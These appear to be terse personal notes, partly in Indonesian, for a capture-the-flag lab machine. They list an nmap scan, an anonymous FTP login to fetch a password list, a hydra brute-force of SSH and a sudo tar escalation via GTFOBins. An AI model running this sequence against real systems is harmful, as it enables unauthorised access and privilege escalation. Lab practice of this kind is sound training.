nmap 10.10.74.138
nano user.txt => isi dengan user yang ditemui
ftp 10.10.74.138
    user:anonymous
        ftp> ls
        ftp> passive (is cannot ls)
        ftp> get locks.txt
hydra -L user.txt -P locks.txt ssh://10.10.10.1 -t 4
sudo -l
    (tar)
gtfobins